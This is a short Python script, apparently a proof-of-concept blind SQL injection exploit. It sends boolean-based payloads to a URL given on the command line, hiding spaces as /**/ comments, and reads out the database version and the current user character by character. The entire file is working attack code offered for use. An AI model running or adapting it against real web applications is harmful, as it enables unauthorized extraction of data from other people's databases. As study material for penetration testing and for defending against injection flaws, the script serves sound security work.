import sys
import requests

def sqli(entry_point, inj_str):
    # search for characters in printable ASCII range
    for j in range(32, 126): 
        target = entry_point + inj_str.replace("[CHAR]", str(j)) 
        r = requests.get(target)
        # Checking response for boolean answer 
        # For this example we are assuming non-zero response means True
        if len(r.text) > 0 :
            return j 
    return None

def main():
    if len(sys.argv) != 2:
        print('(+) usage example: %s http://localhost?param= ' %sys.argv[0])
    entry_point = sys.argv[1] 
    print("(+) Retrieving database version....")
    # 19 is length of the version() string
    for i in range(1, 20): 
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i 
        extracted_char = chr(sqli(entry_point, injection_string)) 
        print(extracted_char, end='', flush=True)
    print("\n(+) Retrieving username....")
    #16 is the maximum length of username
    for i in range(1, 17):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i 
        try:
            extracted_char = chr(sqli(entry_point, injection_string)) 
            print(extracted_char, end='', flush=True)
        except TypeError:
            break
    print("\n(+) done!")

if __name__ == "__main__":
    main()
